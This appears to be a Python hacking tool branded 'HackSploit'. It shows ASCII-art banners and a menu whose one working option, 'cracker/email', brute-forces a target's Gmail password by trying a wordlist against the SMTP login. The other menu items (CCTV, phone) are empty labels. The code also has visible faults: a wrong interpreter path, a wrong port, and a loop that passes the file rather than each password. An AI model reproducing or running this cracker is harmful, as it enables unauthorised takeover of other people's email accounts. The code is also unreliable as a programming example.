#!/use/bin/python3
import os
import random
import smtplib
from colorama import Fore 
from socket import *

logo_1 = Fore.BLUE +  '''
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████║███████║██║     █████╔╝     ███████╗██████╔╝██║     ██║   ██║██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗     ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ███████║██║     ███████╗╚██████╔╝██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
'''
logo_2 = Fore.RED + '''
                      ,____
                      |---.\\
              ___     |    `      HackSploit
             / .-\  ./=)
            |  |"|_/\/|
            ;  |-;| /_|
           / \_| |/ \ |
          /      \/\( |
          |   /  |` ) |
          /   \ _/    |
         /--._/  \    |
         `/|)    |    /
           /     |   |
         .'      |   |
        /         \  |
       (_.-.__.__./  /
'''
logo_3 = Fore.GREEN + '''

                                               _   __,----'~~~~~~~~~`-----.__
                                        .  .    `//====-              ____,-'~`
                        -.            \_|// .   /||\\  `~~~~`---.___./
                  ______-==.       _-~o  `\/    |||  \\           _,'`
            __,--'   ,=='||\=_    ;_,_,/ _-'|-   |`\   \\        ,'
         _-'      ,='    | \\`.    '',/~7  /-   /  ||   `\.     /
       .'       ,'       |  \\  \_  "  /  /-   /   ||      \   /
      / _____  /         |     \\.`-_/  /|- _/   ,||       \ /
     ,-'     `-|--'~~`--_ \     `==-/  `| \'--===-'       _/`
               '         `-|      /|    )-'\~'      _,--"'
                           '-~^\_/ |    |   `\_   ,^             /\
                                /  \     \__   \/~               `\__
                            _,-' _/'\ ,-'~____-'`-/                 ``===\
                            \|||' `.     `\.  ,                _||
             ./                       \_     `\      `~---|__i__i__\--~'_/
            <_n_                     __-^-_    `)  \-.______________,-~'
             `B'\)                  ///,-'~`__--^-  |-------~~~~^'
             /^>                           ///,--~`-\
            `  `                                       HackSploit

'''
logo_4 = Fore.RED + '''
 _______________________________________
|\ ___________________________________ /|
| | _                               _ | |
| |(+)        _           _        (+)| |
| | ~      _--/           \--_      ~ | |
| |       /  /             \  \       | |
| |      /  |               |  \      | |
| |     /   |               |   \     | |
| |     |   |    _______    |   |     | |
| |     |   |    \     /    |   |     | |
| |     \    \_   |   |   _/    /     | |
| |      \     -__|   |__-     /      | |
| |       \_                 _/       | |
| |         --__         __--         | |
| |             --|   |--             | |
| |               |   |               | |
| |                | |                | |
| |                 |                 | |
| |                                   | |
| |   I S   G O O D   F O R   Y O U   | |
| | _                               _ | |
| |(+)                             (+)| |
| | ~                               ~ | |
|/ ----------------------------------- \|
 ---------------------------------------
'''
logo_5 = Fore.BLUE + '''
                         __    _
                    _wr""        "-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P""   ""9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###""          ,Z"#####@" '######"\g          ""M##m
 J#@"             0L  "*##     ##@"  J#              *#K
 #"               `#    "_gmwgm_~    dF               `#_
7F                 "#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@"                   F
                       "PJ#####LP"
 `                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      "*w_________am#####P"   ~9#####mw_________w*"
          ""9@#####@M""           ""P@#####@M""

'''
page = '''
{0}±±±±±± {1}MOST USAGE{0}±±±±±±
{0}[{1}----->{0}] {2}cracker/email
{0}[{1}----->{0}] {2}CCTV/CAMERA
{0}[{1}----->{0}] {2}Connect a new phone
{0}[{1}----->{0}] {2}Exit
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)
show_options = '''
Name                Required  Description
----                --------  -----------
TARGET_EMAIL           yes      This is email for your target.

PASSWORD_FILE          yes      This is password list file.
'''

os.system('clear')
banner_title = random.choice([logo_1,logo_2,logo_3,logo_4,logo_5])
print (Fore.RED + banner_title)
print (page)

def cracker_email():
    smtpserver = smtplib.SMTP("smtp.gmail.com",578)
    smtpserver.ehlo()
    smtpserver.starttls()
    user = input("Email")
    pass_file = input("password")
    pass_file = open(pass_file,"r")
    for password in pass_file:
      try:
         smtpserver.login(user,password)
         print("Password found: %s" % password)
         break
      except smtplib.SMTPAuthenticationError:
         print("Password Not Found")


while True:
      user_input = input(Fore.WHITE + "HSF"+Fore.RED +Fore.WHITE + "> ")

      if user_input == 'exit':
         exit()

      elif user_input == 'cracker/email':

         print(show_options)
         email = input(Fore.WHITE + "HSF"+Fore.WHITE+"("+Fore.RED+"cracker/email"+Fore.WHITE+")"+Fore.WHITE + "> "+Fore.WHITE+"TARGET EMAIL: ")
         pass_file = input(Fore.WHITE + "HSF"+Fore.WHITE+"("+Fore.RED+"cracker/email"+Fore.WHITE+")"+Fore.WHITE + "> "+Fore.WHITE+"PASSWORD FILE: ")
         if email == '' and pass_file == '':
            print(Fore.RED+"["+Fore.BLUE+"+"+Fore.RED+"]"+Fore.WHITE+Fore.RED+"Sorry ")
            exit()
         smtpserver = smtplib.SMTP("smtp.gmail.com",578)
         smtpserver.ehlo()
         smtpserver.starttls()
         pass_file = open(pass_file,"r")
         for password in pass_file:
           try:
              smtpserver.login(email,pass_file)
              print("Password found: %s" % password)
              break
           except smtplib.SMTPAuthenticationError:
              print("Password Not Found %s" % password)



      else:
         print(Fore.RED+"["+Fore.BLUE+"+"+Fore.RED+"]"+Fore.WHITE+"Command not found!")

